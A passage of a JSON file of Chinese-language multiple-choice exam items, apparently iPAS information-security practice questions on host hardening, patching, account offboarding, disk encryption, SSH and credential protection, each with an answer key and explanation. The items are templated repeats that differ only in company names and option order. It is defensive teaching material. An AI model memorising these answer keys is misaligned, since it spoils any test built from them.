    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-203",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "B. 移除系統中預設之範例檔案與測試資料庫",
      "C. 修改預設管理員名稱並設置強密碼",
      "D. 關閉無用連接埠並停用未使用的系統服務"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-204",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "B. 忽視原廠修補程式，自行修改二進位執行檔",
      "C. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "D. 等待半年後下一次大改版再行考慮"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-205",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 讓其繼續保留帳號 90 天以利接交",
      "B. 僅移除電子郵件權限，保留 VPN 連線權限",
      "C. 將其密碼變更為 123456 並轉交給其他同事繼續共用",
      "D. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-206",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 設定 Windows 登入密碼",
      "B. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "C. 安裝傳統特徵碼防毒軟體",
      "D. 僅在桌面資料夾設置密碼壓縮檔"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-207",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 拔掉機殼電源線",
      "B. 每日由警衛搜查員工背包",
      "C. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "D. 貼上防拆貼紙要求員工自律"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-208",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 關閉防火牆日誌",
      "B. 僅記錄檔案刪除事件",
      "C. 關閉所有事件檢視器以節省磁碟空間",
      "D. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-209",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 允許空密碼（PermitEmptyPasswords yes）以利快速連線",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "D. 關閉主機防火牆以減少阻斷"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-210",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. Windows Defender Credential Guard（憑證保護）與 LSA Protection",
      "B. 關閉 Windows Defender 防毒",
      "C. 開放 Guest 訪客帳號",
      "D. 停用 UAC（使用者帳戶控制）"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-211",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 撰寫批次檔由每位員工自行點擊執行",
      "B. 手動至每台電腦修改本機註冊表",
      "C. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "D. 透過電子郵件寄送使用手冊"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-212",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案僅有 root 可以讀取",
      "B. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "C. 該檔案會自動刪除",
      "D. 該檔案將自動加密無法執行"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-213",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 移除系統中預設之範例檔案與測試資料庫",
      "B. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "C. 修改預設管理員名稱並設置強密碼",
      "D. 關閉無用連接埠並停用未使用的系統服務"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-214",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 等待半年後下一次大改版再行考慮",
      "B. 忽視原廠修補程式，自行修改二進位執行檔",
      "C. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "D. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-215",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "B. 讓其繼續保留帳號 90 天以利接交",
      "C. 僅移除電子郵件權限，保留 VPN 連線權限",
      "D. 將其密碼變更為 123456 並轉交給其他同事繼續共用"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-216",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 安裝傳統特徵碼防毒軟體",
      "B. 設定 Windows 登入密碼",
      "C. 僅在桌面資料夾設置密碼壓縮檔",
      "D. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-217",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "B. 每日由警衛搜查員工背包",
      "C. 貼上防拆貼紙要求員工自律",
      "D. 拔掉機殼電源線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-218",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 關閉所有事件檢視器以節省磁碟空間",
      "B. 關閉防火牆日誌",
      "C. 僅記錄檔案刪除事件",
      "D. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-219",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "B. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "C. 關閉主機防火牆以減少阻斷",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-220",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. 關閉 Windows Defender 防毒",
      "B. 停用 UAC（使用者帳戶控制）",
      "C. 開放 Guest 訪客帳號",
      "D. Windows Defender Credential Guard（憑證保護）與 LSA Protection"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-221",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 撰寫批次檔由每位員工自行點擊執行",
      "B. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "C. 透過電子郵件寄送使用手冊",
      "D. 手動至每台電腦修改本機註冊表"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-222",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "B. 該檔案將自動加密無法執行",
      "C. 該檔案僅有 root 可以讀取",
      "D. 該檔案會自動刪除"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-223",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "B. 移除系統中預設之範例檔案與測試資料庫",
      "C. 修改預設管理員名稱並設置強密碼",
      "D. 關閉無用連接埠並停用未使用的系統服務"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-224",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 忽視原廠修補程式，自行修改二進位執行檔",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "D. 等待半年後下一次大改版再行考慮"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-225",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "B. 將其密碼變更為 123456 並轉交給其他同事繼續共用",
      "C. 讓其繼續保留帳號 90 天以利接交",
      "D. 僅移除電子郵件權限，保留 VPN 連線權限"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-226",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 設定 Windows 登入密碼",
      "B. 僅在桌面資料夾設置密碼壓縮檔",
      "C. 安裝傳統特徵碼防毒軟體",
      "D. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-227",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "B. 每日由警衛搜查員工背包",
      "C. 貼上防拆貼紙要求員工自律",
      "D. 拔掉機殼電源線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-228",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 僅記錄檔案刪除事件",
      "B. 關閉防火牆日誌",
      "C. 關閉所有事件檢視器以節省磁碟空間",
      "D. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-229",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 關閉主機防火牆以減少阻斷",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-230",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. 開放 Guest 訪客帳號",
      "B. 關閉 Windows Defender 防毒",
      "C. 停用 UAC（使用者帳戶控制）",
      "D. Windows Defender Credential Guard（憑證保護）與 LSA Protection"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-231",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 手動至每台電腦修改本機註冊表",
      "B. 撰寫批次檔由每位員工自行點擊執行",
      "C. 透過電子郵件寄送使用手冊",
      "D. Active Directory 群組原則物件（GPO, Group Policy Object）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-232",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "B. 該檔案將自動加密無法執行",
      "C. 該檔案僅有 root 可以讀取",
      "D. 該檔案會自動刪除"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-233",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 修改預設管理員名稱並設置強密碼",
      "B. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "C. 移除系統中預設之範例檔案與測試資料庫",
      "D. 關閉無用連接埠並停用未使用的系統服務"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-234",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 忽視原廠修補程式，自行修改二進位執行檔",
      "D. 等待半年後下一次大改版再行考慮"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-235",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 讓其繼續保留帳號 90 天以利接交",
      "B. 僅移除電子郵件權限，保留 VPN 連線權限",
      "C. 將其密碼變更為 123456 並轉交給其他同事繼續共用",
